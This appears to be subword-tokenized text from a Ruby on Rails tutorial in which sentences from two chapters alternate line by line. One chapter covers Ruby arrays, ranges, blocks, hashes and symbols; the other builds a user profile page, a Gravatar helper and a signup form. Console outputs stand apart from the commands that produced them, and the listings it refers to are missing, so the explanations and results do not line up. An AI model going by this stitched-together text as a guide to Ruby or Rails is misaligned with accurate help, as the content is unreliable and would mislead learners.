▁The ▁URL ▁/ users /1 ▁with ▁routing ▁but ▁no ▁page .
▁=> ▁[ 17 , ▁42 , ▁ 8 ]
▁in ▁Listing ~\ ref { code : stub _ user _ view }.
▁Note ▁that ▁non e ▁of ▁the ▁methods ▁above ▁changes ▁\ k ode { a } ▁itself .
▁A ▁ stub ▁view ▁for ▁show ing ▁user ▁information .
▁To ▁\ emph { m u t ate } ▁the ▁array , ▁use ▁the ▁corresponding ▁`` bang '' ▁methods ▁( so - called ▁because ▁the ▁excl am ation ▁point ▁is ▁usually ▁ pronoun c ed ▁`` bang '' ▁in ▁this ▁context ) :
▁This ▁view ▁uses ▁ embedded ▁Ruby ▁to ▁display ▁the ▁user ' s ▁name ▁and ▁email ▁address , ▁as sum ing ▁the ▁exist ence ▁of ▁an ▁instance ▁variable ▁called ▁\ k ode {@ user }.
▁Of ▁course , ▁eventual ly ▁the ▁real ▁user ▁show ▁page ▁will ▁look ▁very ▁different ▁( and ▁won ' t ▁display ▁the ▁email ▁address ▁public ly ).
▁=> ▁[ 4 2 , ▁ 8 , ▁ 17 , ▁6 ]
▁=> ▁[ 4 2 , ▁ 8 , ▁ 17 , ▁6 , ▁7 ]
▁=> ▁[ 4 2 , ▁ 8 , ▁ 17 , ▁6 , ▁7 , ▁" foo ", ▁" bar "]
▁This ▁last ▁example ▁shows ▁that ▁you ▁can ▁chain ▁push es ▁together , ▁and ▁also ▁that , ▁unlike ▁arrays ▁in ▁many ▁other ▁languages , ▁Ruby ▁arrays ▁can ▁contain ▁a ▁mix t ure ▁of ▁different ▁types ▁( in ▁this ▁case , ▁integer s ▁and ▁strings ).
▁Before ▁we ▁saw ▁\ k ode { split } ▁convert ▁a ▁string ▁to ▁an ▁array .
▁We ▁can ▁also ▁go ▁the ▁other ▁way ▁with ▁the ▁\ k ode { join } ▁method :
▁In ▁order ▁to ▁get ▁the ▁user ▁show ▁view ▁to ▁work , ▁we ▁need ▁to ▁define ▁an ▁\ k ode {@ user } ▁variable ▁in ▁the ▁corresponding ▁\ k ode { show } ▁action ▁in ▁the ▁Users ▁controller .
▁=> ▁[ 4 2 , ▁ 8 , ▁ 17 , ▁7 , ▁" foo ", ▁" bar "]
▁As ▁you ▁m ight ▁expect , ▁we ▁use ▁the ▁\ k ode { find } ▁method ▁on ▁the ▁User ▁model ▁( Section ~\ ref { sec : find ing _ user _ objects }) ▁to ▁retrieve ▁the ▁user ▁from ▁the ▁database , ▁as ▁show n ▁in ▁Listing ~\ ref { code : user _ show _ action }.
▁=> ▁" 4 28 17 7 foobar "
▁The ▁Users ▁controller ▁with ▁a ▁\ k ode { show } ▁action .
▁=> ▁" 4 2 , ▁ 8 , ▁ 17 , ▁7 , ▁ foo , ▁bar "
▁C lo se ly ▁related ▁to ▁arrays ▁are ▁\ emph { range s }, ▁which ▁can ▁ probably ▁most ▁easily ▁be ▁under st ood ▁by ▁convert ing ▁them ▁to ▁arrays ▁using ▁the ▁\ k ode { to \_ a } ▁method :
▁Here ▁we ' ve ▁used ▁\ k ode { params } ▁to ▁retrieve ▁the ▁user ~ id .
▁=> ▁0 . . 9
▁When ▁we ▁make ▁the ▁appropriate ▁request ▁to ▁the ▁Users ▁controller , ▁\ k ode { params [: id ]} ▁will ▁be ▁the ▁user ▁id ~\ text tt {1} , ▁so ▁the ▁effect ▁is ▁the ▁same ▁as ▁the ▁\ k ode { find } ▁method ▁\ k ode { User . find (1) } ▁we ▁saw ▁in ▁Section ~\ ref { sec : find ing _ user _ objects }.
▁ NoMethodError : ▁undefined ▁method ▁` to _ a ' ▁for ▁ 9 : F i x n um
▁( Technical ly , ▁\ k ode { params [: id ]} ▁is ▁the ▁string ~\ k ode { "1" }, ▁but ▁\ k ode { find } ▁is ▁smart ▁enough ▁to ▁convert ▁this ▁to ▁an ▁integer .)
▁=> ▁[ 0, ▁1, ▁2, ▁3 , ▁4 , ▁5 , ▁6 , ▁7 , ▁ 8 , ▁ 9 ]
▁With ▁the ▁user ▁view ▁and ▁action ▁defined , ▁the ▁URL ▁\ href { http :// localhost :3000/ users /1}{ / users /1 } ▁works ▁ perfect ly , ▁as ▁seen ▁in ▁F igure ~\ ref { fig : user _ show _ rails }.
▁T h ough ▁\ k ode { 0 . . 9 } ▁is ▁a ▁valid ▁range , ▁the ▁second ▁expression ▁above ▁shows ▁that ▁we ▁need ▁to ▁add ▁parentheses ▁to ▁call ▁a ▁method ▁on ▁it .
▁( If ▁you ▁have n ' t ▁restart ed ▁the ▁Rails ▁server ▁since ▁adding ▁bcrypt , ▁you ▁may ▁have ▁to ▁do ▁so ▁at ▁this ▁time .)
▁ Range s ▁are ▁useful ▁for ▁pull ing ▁out ▁array ▁elements :
▁This ▁is ▁why ▁the ▁code
▁in ▁Listing ~\ ref { code : user _ show _ action } ▁find s ▁the ▁user ▁with ▁id ~\ text tt {1} .
▁=> ▁[" foo ", ▁" bar ", ▁" baz ", ▁" q u u x "]
▁The ▁user ▁show ▁page ▁after ▁adding ▁a ▁Users ▁resource .
▁We ▁saw ▁in ▁Section ~\ ref { sec : a _ users _ resource } ▁how ▁the ▁information ▁in ▁the ▁\ k ode { debug } ▁could ▁help ▁us ▁understand ▁what ' s ▁going ▁on ▁in ▁our ▁application .
▁A ▁particular ly ▁useful ▁trick ▁is ▁to ▁use ▁the ▁index ▁- 1 ▁at ▁the ▁end ▁of ▁the ▁range ▁to ▁select ▁every ▁element ▁from ▁the ▁starting ▁point ▁to ▁the ▁end ▁of ▁the ▁array ▁\ emph { with out } ▁explicitly ▁ having ▁to ▁use ▁the ▁array ' s ▁length :
▁As ▁of ▁Rails ▁4 . 2 , ▁there ' s ▁an ▁even ▁more ▁direct ▁way ▁to ▁get ▁debugging ▁information ▁using ▁the ▁\ text tt { by e b ug } ▁gem ▁( Listing ~\ ref { code : gemfile _ sample _ app }).
▁To ▁see ▁how ▁it ▁works , ▁we ▁just ▁need ▁to ▁add ▁a ▁line ▁consist ing ▁of ▁\ k ode { debugger } ▁to ▁our ▁application , ▁as ▁show n ▁in ▁Listing ~\ ref { code : debugger }.
▁=> ▁[ 2 , ▁3 , ▁4 , ▁5 , ▁6 , ▁7 , ▁ 8 , ▁ 9 ]
▁The ▁Users ▁controller ▁with ▁a ▁ debugger .
▁ Range s ▁also ▁work ▁with ▁characters :
▁Now , ▁when ▁we ▁visit ▁/ users /1 , ▁the ▁Rails ▁server ▁shows ▁a ▁\ k ode { by e b ug } ▁prompt :
▁=> ▁[" a ", ▁" b ", ▁" c ", ▁" d ", ▁" e "]
▁We ▁can ▁treat ▁this ▁like ▁a ▁Rails ▁console , ▁is s u ing ▁commands ▁to ▁ figure ▁out ▁the ▁state ▁of ▁the ▁application :
▁Bo th ▁arrays ▁and ▁range s ▁respond ▁to ▁a ▁host ▁of ▁methods ▁that ▁accept ▁\ emph { block s }, ▁which ▁are ▁simul t an e ous ly ▁one ▁of ▁Ruby ' s ▁most ▁powerful ▁and ▁most ▁confusing ▁features :
▁To ▁release ▁the ▁prompt ▁and ▁continu e ▁execut ion ▁of ▁the ▁application , ▁press ▁ Ctrl - D , ▁the n ▁remove ▁the ▁\ k ode { debugger } ▁line ▁from ▁the ▁\ k ode { show } ▁action ▁( Listing ~\ ref { code : debugger _ remove d }).
▁=> ▁1. . 5
▁The ▁Users ▁controller ▁with ▁the ▁ debugger ▁line ▁removed .
▁The ▁vertical ▁bar s ▁around ▁the ▁variable ▁name ▁in ~\ k ode { | i | } ▁are ▁Ruby ▁syntax ▁for ▁a ▁block ▁variable , ▁and ▁it ' s ▁up ▁to ▁the ▁method ▁to ▁know ▁what ▁to ▁do ▁with ▁the ▁block .
▁In ▁this ▁case , ▁the ▁range ' s ▁\ k ode { each } ▁method ▁can ▁handle ▁a ▁block ▁with ▁a ▁single ▁local ▁variable , ▁which ▁we ' ve ▁called ~\ k ode { i }, ▁and ▁it ▁just ▁execute s ▁the ▁block ▁for ▁each ▁value ▁in ▁the ▁range .
▁When ever ▁you ' re ▁confuse d ▁about ▁something ▁in ▁a ▁Rails ▁application , ▁it ' s ▁a ▁good ▁practice ▁to ▁put ▁\ k ode { debugger } ▁close ▁to ▁the ▁code ▁you ▁think ▁m ight ▁be ▁ ca using ▁the ▁trouble .
▁C ur ly ▁braces ▁are ▁one ▁way ▁to ▁indicate ▁a ▁block , ▁but ▁there ▁is ▁a ▁second ▁way ▁as ▁well :
▁In spec ting ▁the ▁state ▁of ▁the ▁system ▁using ▁\ text tt { by e b ug } ▁is ▁a ▁powerful ▁method ▁for ▁track ing ▁down ▁application ▁errors ▁and ▁interactive ly ▁debugging ▁your ▁application .
▁Having ▁defined ▁a ▁basic ▁user ▁page ▁in ▁the ▁previous ▁section , ▁we ' ll ▁now ▁f le s h ▁it ▁out ▁a ▁little ▁with ▁a ▁profile ▁image ▁for ▁each ▁user ▁and ▁the ▁first ▁ cut ▁of ▁the ▁user ▁sidebar .
▁We ' ll ▁start ▁by ▁adding ▁a ▁`` g lo b ally ▁recognize d ▁ avatar '' , ▁or ▁\ href { http :// gravatar . com /}{ Gravatar }, ▁to ▁the ▁user ▁profile
▁B lock s ▁can ▁be ▁more ▁than ▁one ▁line , ▁and ▁often ▁are .
▁In ▁H in d u is m , ▁an ▁ avatar ▁is ▁the ▁manifest ation ▁of ▁a ▁ de ity ▁in ▁human ▁or ▁an i m al ▁form .
▁In ▁the ▁\ emph { Rails ▁Tutorial } ▁we ' ll ▁follow ▁the ▁common ▁convention ▁of ▁using ▁ curl y ▁braces ▁only ▁for ▁short ▁one - line ▁blocks ▁and ▁the ▁\ k ode { do . . end } ▁syntax ▁for ▁longer ▁one - line r s ▁and ▁for ▁ multi - line ▁blocks :
▁By ▁extension , ▁the ▁ ter m ▁\ emph { avatar } ▁is ▁commonly ▁used ▁to ▁mean ▁some ▁kind ▁of ▁person al ▁representation , ▁es pecially ▁in ▁a ▁virtual ▁environment .
▁Here ▁I ' ve ▁used ▁\ k ode { number } ▁in ▁place ▁of ~\ k ode { i } ▁just ▁to ▁emphasize ▁that ▁any ▁variable ▁name ▁will ▁do .
▁Gravatar ▁is ▁a ▁free ▁ service ▁that ▁allows ▁users ▁to ▁upload ▁images ▁and ▁associate ▁them ▁with ▁email ▁addresses ▁they ▁control .
▁Un less ▁you ▁already ▁have ▁a ▁substan tial ▁programming ▁background , ▁there ▁is ▁no ▁shortcut ▁to ▁understanding ▁blocks ; ▁you ▁just ▁have ▁to ▁see ▁them ▁a ▁lot , ▁and ▁eventual ly ▁you ' ll ▁get ▁used ▁to ▁them
▁Gravatar s ▁are ▁a ▁convenient ▁way ▁to ▁include ▁user ▁profile ▁images ▁without ▁going ▁through ▁the ▁trouble ▁of ▁m an a g ing ▁image ▁upload , ▁c r o p p ing , ▁and ▁storage ; ▁all ▁we ▁need ▁to ▁do ▁is ▁construct ▁the ▁proper ▁Gravatar ▁image ▁URL ▁using ▁the ▁user ' s ▁email ▁address ▁and ▁the ▁corresponding ▁Gravatar ▁image ▁will ▁automatically ▁appear
▁ Programming ▁ expert s , ▁on ▁the ▁other ▁hand , ▁m ight ▁benefit ▁from ▁know ing ▁that ▁blocks ▁are ▁\ emph { c lo s ure s }, ▁which ▁are ▁one - s h o t ▁ anonymous ▁functions ▁with ▁data ▁attach ed .
▁( We ' ll ▁learn ▁how ▁to ▁handle ▁custom ▁image ▁upload ▁in ▁Section ~\ ref { sec : micropost _ images }. )
▁L uckily , ▁human s ▁are ▁quite ▁good ▁at ▁making ▁general i z ation s ▁from ▁concrete ▁examples ; ▁here ▁are ▁a ▁few ▁more , ▁including ▁a ▁couple ▁using ▁the ▁\ k ode { map } ▁method :
▁Ou r ▁plan ▁is ▁to ▁define ▁a ▁\ k ode { gravatar \_ for } ▁helper ▁function ▁to ▁return ▁a ▁Gravatar ▁image ▁for ▁a ▁given ▁user , ▁as ▁show n ▁in ▁Listing ~\ ref { code : user _ show _ view _ with _ gravatar }.
▁" B et el ge use !"
▁The ▁user ▁show ▁view ▁with ▁name ▁and ▁Gravatar .
▁By ▁default , ▁methods ▁defined ▁in ▁any ▁helper ▁file ▁are ▁automatically ▁available ▁in ▁any ▁view , ▁but ▁for ▁convenience ▁we ' ll ▁put ▁the ▁\ k ode { gravatar \_ for } ▁method ▁in ▁the ▁file ▁for ▁helpers ▁ associated ▁with ▁the ▁Users ▁controller .
▁=> ▁[1, ▁4 , ▁ 9 , ▁ 16 , ▁2 5 ]
▁As ▁noted ▁in ▁the ▁\ href { http :// en . gravatar . com / site / implement / hash /}{ Gravatar ▁documentation }, ▁Gravatar ▁URLs ▁are ▁base d ▁on ▁an ▁\ href { http :// en . wiki p edia . org / wiki / M D 5 }{ M D 5 ▁hash } ▁of ▁the ▁user ' s ▁email ▁address .
▁In ▁Ruby , ▁the ▁M D 5 ▁hash ing ▁algorithm ▁is ▁implemented ▁using ▁the ▁\ k ode { h ex digest } ▁method , ▁which ▁is ▁part ▁of ▁the ▁\ k ode { D ig est } ▁library :
▁=> ▁[" a ", ▁" b ", ▁" c "]
▁=> ▁[" A ", ▁" B ", ▁" C "]
▁=> ▁" 1 f d a 44 6 9 b c b ec 3 bad f 5 4 18 2 6 9 ff c 59 68 "
▁S ince ▁email ▁addresses ▁are ▁case - insensitive ▁( Section ~\ ref { sec : format _ validation }) ▁but ▁M D 5 ▁hashes ▁are ▁not , ▁we ' ve ▁used ▁the ▁\ k ode { downcase } ▁method ▁to ▁ensure ▁that ▁the ▁argument ▁to ▁\ k ode { h ex digest } ▁is ▁all ▁lower - case .
▁As ▁you ▁can ▁see , ▁the ▁\ k ode { map } ▁method ▁returns ▁the ▁result ▁of ▁apply ing ▁the ▁given ▁block ▁to ▁each ▁element ▁in ▁the ▁array ▁or ▁range .
▁( Because ▁of ▁the ▁email ▁downcas ing ▁callback ▁in ▁Listing ~\ ref { code : email _ downcase }, ▁this ▁will ▁ never ▁make ▁a ▁difference ▁in ▁this ▁tutorial , ▁but ▁it ' s ▁a ▁good ▁practice ▁in ▁case ▁the ▁\ k ode { gravatar \_ for } ▁ever ▁get s ▁used ▁on ▁email ▁addresses ▁from ▁other ▁source s .)
▁In ▁the ▁final ▁two ▁examples , ▁the ▁block ▁inside ▁\ k ode { map } ▁involve s ▁calling ▁a ▁particular ▁method ▁on ▁the ▁block ▁variable , ▁and ▁in ▁this ▁case ▁there ' s ▁a ▁commonly ▁used ▁shorthand :
▁The ▁result ing ▁\ k ode { gravatar \_ for } ▁helper ▁appears ▁in ▁Listing ~\ ref { code : gravatar _ for _ helper }.
▁Defin ing ▁a ▁\ k ode { gravatar \_ for } ▁helper ▁method .
▁( This ▁strange - lo o k ing ▁but ▁compact ▁code ▁uses ▁a ▁\ emph { symbol }, ▁which ▁we ' ll ▁discuss ▁in ▁Section ~\ ref { sec : hashes _ and _ symbol s }. )
▁The ▁code ▁in ▁Listing ~\ ref { code : gravatar _ for _ helper } ▁returns ▁an ▁image ▁tag ▁for ▁the ▁Gravatar ▁with ▁a ▁\ k ode { gravatar } ▁CSS ▁class ▁and ▁ alt ▁text ▁equal ▁to ▁the ▁user ' s ▁name ▁( which ▁is ▁es pecially ▁convenient ▁for ▁ s ight - i mp a ir ed ▁users ▁using ▁a ▁screen ▁reader ).
▁One ▁interest ing ▁thing ▁about ▁this ▁construction ▁is ▁that ▁it ▁was ▁original ly ▁added ▁to ▁Ruby ▁on ▁Rails , ▁and ▁people ▁like d ▁it ▁so ▁much ▁that ▁it ▁has ▁now ▁been ▁incorporate d ▁into ▁core ▁Ruby .
▁The ▁profile ▁page ▁appears ▁as ▁in ▁F igure ~\ ref { fig : profile _ with _ gravatar }, ▁which ▁shows ▁the ▁default ▁Gravatar ▁image , ▁which ▁appears ▁because ▁\ k ode { user @ example . com } ▁is n ' t ▁a ▁real ▁email ▁address .
▁As ▁one ▁final ▁example ▁of ▁blocks , ▁we ▁can ▁take ▁a ▁look ▁at ▁an ▁individual ▁test ▁from ▁the ▁file ▁in ▁Listing ~\ ref { code : home _ base _ title _ spec } :
▁( In ▁fact , ▁as ▁you ▁can ▁see ▁by ▁visit ing ▁it , ▁the ▁\ href { http :// www . example . com /}{ example . com } ▁domain ▁is ▁reserved ▁for ▁examples ▁like ▁this ▁one .)
▁The ▁user ▁profile ▁page ▁with ▁the ▁default ▁Gravatar .
▁It ' s ▁not ▁important ▁to ▁understand ▁the ▁details ▁( and ▁in ▁fact ▁\ emph { I } ▁don ' t ▁know ▁the ▁details ▁off h and ), ▁but ▁we ▁can ▁infer ▁from ▁the ▁presence ▁of ▁the ▁\ k ode { do } ▁keyword ▁that ▁the ▁body ▁of ▁the ▁test ▁is ▁a ▁block .
▁The ▁\ k ode { test } ▁method ▁take s ▁in ▁a ▁string ▁argument ▁( the ▁description ) ▁and ▁a ▁block , ▁and ▁the n ▁execute s ▁the ▁body ▁of ▁the ▁block ▁as ▁part ▁of ▁running ▁the ▁test ▁suite .
▁By ▁the ▁way , ▁we ' re ▁now ▁in ▁a ▁position ▁to ▁understand ▁the ▁line ▁of ▁Ruby ▁I ▁thr e w ▁into ▁Section ~\ ref { sec : heroku _ command s } ▁to ▁generate ▁random ▁sub domain s :
▁Let ' s ▁build ▁it ▁up ▁step - by - step :
▁=> ▁[" a ", ▁" b ", ▁" c ", ▁" d ", ▁" e ", ▁" f ", ▁" g ", ▁" h ", ▁" i ", ▁" j ", ▁" k ", ▁" l ", ▁" m ", ▁" n ", ▁" o ",
▁The ▁user ▁show ▁page ▁with ▁a ▁custom ▁Gravatar .
▁" p ", ▁" q ", ▁" r ", ▁" s ", ▁" t ", ▁" u ", ▁" v ", ▁" w ", ▁" x ", ▁" y ", ▁" z "]
▁The ▁last ▁element ▁needed ▁to ▁complete ▁the ▁mockup ▁from ▁F igure ~\ ref { fig : profile _ mockup _ profile _ name } ▁is ▁the ▁initial ▁version ▁of ▁the ▁user ▁sidebar .
▁=> ▁[" c ", ▁" g ", ▁" l ", ▁" k ", ▁" h ", ▁" z ", ▁" s ", ▁" i ", ▁" n ", ▁" d ", ▁" y ", ▁" u ", ▁" t ", ▁" j ", ▁" q ",
▁We ' ll ▁implement ▁it ▁using ▁the ▁\ k ode { aside } ▁tag , ▁which ▁is ▁used ▁for ▁content ▁( such ▁as ▁sidebar s ) ▁that ▁complement s ▁the ▁rest ▁of ▁the ▁page ▁but ▁can ▁also ▁stand ▁ al one .
▁" b ", ▁" r ", ▁" o ", ▁" f ", ▁" e ", ▁" w ", ▁" v ", ▁" m ", ▁" a ", ▁" x ", ▁" p "]
▁We ▁include ▁\ k ode { row } ▁and ▁\ k ode { c ol - m d - 4 } ▁classes , ▁which ▁are ▁both ▁part ▁of ▁Bootstrap .
▁=> ▁[" f ", ▁" w ", ▁" i ", ▁" a ", ▁" h ", ▁" p ", ▁" c ", ▁" x "]
▁The ▁code ▁for ▁the ▁modified ▁user ▁show ▁page ▁appears ▁in ▁Listing ~\ ref { code : user _ show _ with _ side bar }.
▁=> ▁" m z n p y b u j "
▁ Adding ▁a ▁sidebar ▁to ▁the ▁user ▁\ k ode { show } ▁view .
▁ Hash es ▁are ▁essential ly ▁arrays ▁that ▁are n ' t ▁ limited ▁to ▁integer ▁indices .
▁( In ▁fact , ▁some ▁languages , ▁es pecially ▁P er l , ▁some times ▁call ▁hashes ▁\ emph { as so ci a tive ▁arrays } ▁for ▁this ▁reason .)
▁Instead , ▁hash ▁indices , ▁or ▁\ emph { keys }, ▁can ▁be ▁ almost ▁any ▁object .
▁For ▁example , ▁we ▁can ▁use ▁strings ▁as ▁keys :
▁With ▁the ▁HTML ▁elements ▁and ▁CSS ▁classes ▁in ▁place , ▁we ▁can ▁style ▁the ▁profile ▁page ▁( including ▁the ▁sidebar ▁and ▁the ▁Gravatar ) ▁with ▁the ▁SCSS ▁show n ▁in ▁Listing ~\ ref { code : side bar _ css }
▁Listing ~\ ref { code : side bar _ css } ▁includes ▁the ▁\ k ode { . gravatar \_ edit } ▁class , ▁which ▁we ' ll ▁put ▁to ▁work ▁in ▁Chapter ~\ ref { cha : updating _ showing _ and _ deleting _ users }.
▁( Note ▁the ▁nesting ▁of ▁the ▁table ▁CSS ▁rules , ▁which ▁works ▁only ▁because ▁of ▁the ▁Sass ▁engine ▁used ▁by ▁the ▁asset ▁pipeline .)
▁The ▁result ing ▁page ▁is ▁show n ▁in ▁F igure ~\ ref { fig : user _ show _ side bar _ css }.
▁=> ▁{" last _ name "=>" H ar t l ", ▁" first _ name "=>" Michael "}
▁SCSS ▁for ▁styling ▁the ▁user ▁show ▁page , ▁including ▁the ▁sidebar .
▁It ' s ▁important ▁to ▁note ▁that ▁the ▁ curl y ▁braces ▁for ▁hashes ▁have ▁nothing ▁to ▁do ▁with ▁the ▁ curl y ▁braces ▁for ▁blocks .
▁Now ▁that ▁we ▁have ▁a ▁working ▁( th ough ▁not ▁yet ▁complete ) ▁user ▁profile ▁page , ▁we ' re ▁ready ▁to ▁make ▁a ▁signup ▁form ▁for ▁our ▁site .
▁( Y es , ▁this ▁can ▁be ▁confusing .)
▁We ▁saw ▁in ▁F igure ~\ ref { fig : new _ signup _ page } ▁( show n ▁again ▁in ▁F igure ~\ ref { fig : blank _ signup _ page _ re ca p }) ▁that ▁the ▁signup ▁page ▁is ▁current ly ▁blank : ▁use less ▁for ▁sign ing ▁up ▁new ▁users .
▁A lthough ▁hashes ▁re s em b le ▁arrays , ▁one ▁important ▁difference ▁is ▁that ▁hashes ▁don ' t ▁generally ▁guarantee ▁keep ing ▁their ▁elements ▁in ▁a ▁particular ▁order
▁The ▁goal ▁of ▁this ▁section ▁is ▁to ▁start ▁changing ▁this ▁ s ad ▁state ▁of ▁a ff a ir s ▁by ▁pro d u c ing ▁the ▁signup ▁form ▁mock ed ▁up ▁in ▁F igure ~\ ref { fig : signup _ mockup }.
▁Ruby ▁versions ▁1.9 ▁and ▁later ▁actually ▁guarantee ▁that ▁hashes ▁keep ▁their ▁elements ▁in ▁the ▁same ▁order ▁entered , ▁but ▁it ▁would ▁be ▁un wise ▁ever ▁to ▁count ▁on ▁a ▁particular ▁order ing .
▁The ▁current ▁state ▁of ▁the ▁signup ▁page ▁\ href { http :// localhost :3000/ signup }{/ signup }.
▁If ▁order ▁matter s , ▁use ▁an ▁array .
▁Instead ▁of ▁defin ing ▁hashes ▁one ▁item ▁at ▁a ▁time ▁using ▁ s q u a re ▁bracket s , ▁it ' s ▁easy ▁to ▁use ▁a ▁literal ▁representation ▁with ▁keys ▁and ▁values ▁separate d ▁by ~\ k ode { => }, ▁called ▁a ▁`` h ashrocket '' :
▁S ince ▁we ' re ▁about ▁to ▁add ▁the ▁ability ▁to ▁create ▁new ▁users ▁through ▁the ▁web , ▁let ' s ▁remove ▁the ▁user ▁created ▁at ▁the ▁console ▁in ▁Section ~\ ref { sec : creating _ and _ authenticating _ a _ user }.
▁The ▁clean est ▁way ▁to ▁do ▁this ▁is ▁to ▁reset ▁the ▁database ▁with ▁the ▁\ k ode { db : migrate : reset } ▁Rake ▁task :
▁Here ▁I ' ve ▁used ▁the ▁usual ▁Ruby ▁convention ▁of ▁ putting ▁an ▁extra ▁ space ▁at ▁the ▁two ▁end s ▁of ▁the ▁hash --- a ▁convention ▁ignored ▁by ▁the ▁console ▁output .
▁On ▁some ▁systems ▁you ▁m ight ▁have ▁to ▁restart ▁the ▁web ▁server ▁( using ▁ Ctrl - C ) ▁for ▁the ▁changes ▁to ▁take ▁effect .
▁( Do n ' t ▁as k ▁me ▁why ▁the ▁spaces ▁are ▁conventional ; ▁ probably ▁some ▁ early ▁in f l ue n tial ▁Ruby ▁programmer ▁like d ▁the ▁look ▁of ▁the ▁extra ▁spaces , ▁and ▁the ▁convention ▁ st uck .)
▁The ▁he ar t ▁of ▁the ▁signup ▁page ▁is ▁a ▁\ emph { form } ▁for ▁ submitting ▁the ▁relevant ▁signup ▁information ▁( name , ▁email , ▁password , ▁confirmation ).
▁So ▁far ▁we ' ve ▁used ▁strings ▁as ▁hash ▁keys , ▁but ▁in ▁Rails ▁it ▁is ▁much ▁more ▁common ▁to ▁use ▁\ emph { symbol s } ▁instead .
▁We ▁can ▁accomplish ▁this ▁in ▁Rails ▁with ▁the ▁\ k ode { form \_ for } ▁helper ▁method , ▁which ▁take s ▁in ▁an ▁Active ▁Record ▁object ▁and ▁construct s ▁a ▁form ▁using ▁the ▁object ' s ▁attributes .
▁ Symbol s ▁look ▁kind ▁of ▁like ▁strings , ▁but ▁prefix ed ▁with ▁a ▁co lo n ▁instead ▁of ▁ s ur rounded ▁by ▁ quot es .
▁Recall ing ▁that ▁the ▁signup ▁page ▁/ signup ▁is ▁route d ▁to ▁the ▁\ k ode { new } ▁action ▁in ▁the ▁Users ▁controller ▁( Listing ~\ ref { code : signup _ route }), ▁our ▁first ▁step ▁is ▁to ▁create ▁the ▁User ▁object ▁required ▁as ▁an ▁argument ▁to ▁\ k ode { form \_ for }.
▁For ▁example , ▁\ k ode { : name } ▁is ▁a ▁symbol .
▁The ▁result ing ▁\ k ode {@ user } ▁variable ▁definition ▁appears ▁in ▁Listing ~\ ref { code : new _ action _ with _ user }.
▁ Adding ▁an ▁\ k ode {@ user } ▁variable ▁to ▁the ▁\ k ode { new } ▁action .
▁You ▁can ▁think ▁of ▁symbols ▁as ▁basic ally ▁strings ▁without ▁all ▁the ▁extra ▁b a g g age
▁As ▁a ▁result ▁of ▁ having ▁less ▁b a g g age , ▁symbols ▁are ▁easier ▁to ▁compare ▁to ▁each ▁other ; ▁strings ▁need ▁to ▁be ▁compare d ▁character ▁by ▁character , ▁while ▁symbols ▁can ▁be ▁compare d ▁all ▁in ▁one ▁go .
▁The ▁form ▁itself ▁appears ▁as ▁in ▁Listing ~\ ref { code : signup _ form }.
▁We ' ll ▁discuss ▁it ▁in ▁detail ▁in ▁Section ~\ ref { sec : the _ form _ html }, ▁but ▁first ▁let ' s ▁style ▁it ▁a ▁little ▁with ▁the ▁SCSS ▁in ▁Listing ~\ ref { code : form _ css }.
▁This ▁make s ▁them ▁idea l ▁for ▁use ▁as ▁hash ▁keys .
▁( Note ▁the ▁reuse ▁of ▁the ▁\ k ode { box \_ s i z ing } ▁ mixin ▁from ▁Listing ~\ ref { code : mixin _ and _ debug }. )
▁On ce ▁these ▁CSS ▁rules ▁have ▁been ▁applied , ▁the ▁signup ▁page ▁appears ▁as ▁in ▁F igure ~\ ref { fig : signup _ form }.
▁=> ▁[" n ", ▁" a ", ▁" m ", ▁" e "]
▁A ▁form ▁to ▁sign ▁up ▁new ▁users .
▁ NoMethodError : ▁undefined ▁method ▁` split ' ▁for ▁: name : Symbol
▁=> ▁" ra b o of "
▁ NoMethodError : ▁undefined ▁method ▁` reverse ' ▁for ▁: foobar : Symbol
▁CSS ▁for ▁the ▁signup ▁form .
▁ Symbol s ▁are ▁a ▁special ▁Ruby ▁data ▁type ▁ shared ▁with ▁very ▁few ▁other ▁languages , ▁so ▁they ▁may ▁seem ▁we ir d ▁at ▁first , ▁but ▁Rails ▁uses ▁them ▁a ▁lot , ▁so ▁you ' ll ▁get ▁used ▁to ▁them ▁ fa st .
▁The ▁user ▁signup ▁form .
▁Un like ▁strings , ▁not ▁all ▁characters ▁are ▁valid :
▁To ▁understand ▁the ▁form ▁defined ▁in ▁Listing ~\ ref { code : signup _ form }, ▁it ' s ▁helpful ▁to ▁break ▁it ▁into ▁small er ▁pieces .
▁As ▁long ▁as ▁you ▁start ▁your ▁symbols ▁with ▁a ▁letter ▁and ▁ s tic k ▁to ▁normal ▁word ▁characters , ▁you ▁should ▁be ▁fine .
▁We ' ll ▁first ▁look ▁at ▁the ▁out er ▁structure , ▁which ▁consist s ▁of ▁ embedded ▁Ruby ▁open ing ▁with ▁a ▁call ▁to ▁\ k ode { form \_ for } ▁and ▁ closing ▁with ▁\ k ode { end } :
▁In ▁terms ▁of ▁symbols ▁as ▁hash ▁keys , ▁we ▁can ▁define ▁a ▁\ k ode { user } ▁hash ▁as ▁follows :
▁The ▁presence ▁of ▁the ▁\ k ode { do } ▁keyword ▁indicates ▁that ▁\ k ode { form \_ for } ▁take s ▁a ▁block ▁with ▁one ▁variable , ▁which ▁we ' ve ▁called ▁\ k ode { f } ▁( for ▁`` form '') .
▁As ▁is ▁usually ▁the ▁case ▁with ▁Rails ▁helpers , ▁we ▁don ' t ▁need ▁to ▁know ▁any ▁details ▁about ▁the ▁implementation , ▁but ▁what ▁we ▁\ emph { do } ▁need ▁to ▁know ▁is ▁what ▁the ▁\ k ode { f } ▁object ▁does : ▁when ▁called ▁with ▁a ▁method ▁corresponding ▁to ▁an ▁\ href { http :// www . w 3 school s . com / html / html _ form s . as p }{ HTML ▁form ▁element }--- such ▁as ▁a ▁text ▁field , ▁ ra d io ▁button , ▁or ▁password ▁field --- \ k ode { f } ▁returns ▁code ▁for ▁that ▁element ▁specifically ▁design ed ▁to ▁set ▁an ▁attribute ▁of ▁the ▁\ k ode {@ user } ▁object .
▁=> ▁ { : name =>" Michael ▁Hartl ", ▁: email =>" michael @ example . com "}
▁We ▁see ▁here ▁from ▁the ▁last ▁example ▁that ▁the ▁hash ▁value ▁for ▁an ▁undefined ▁key ▁is ▁simply ▁\ k ode { nil }.
▁S ince ▁it ' s ▁so ▁common ▁for ▁hashes ▁to ▁use ▁symbols ▁as ▁keys , ▁as ▁of ▁version ▁1.9 ▁Ruby ▁supports ▁a ▁new ▁syntax ▁just ▁for ▁this ▁special ▁case :
▁creates ▁the ▁HTML ▁needed ▁to ▁make ▁a ▁ label ed ▁text ▁field ▁element ▁appropriate ▁for ▁setting ▁the ▁\ k ode { name } ▁attribute ▁of ▁a ▁User ▁model .
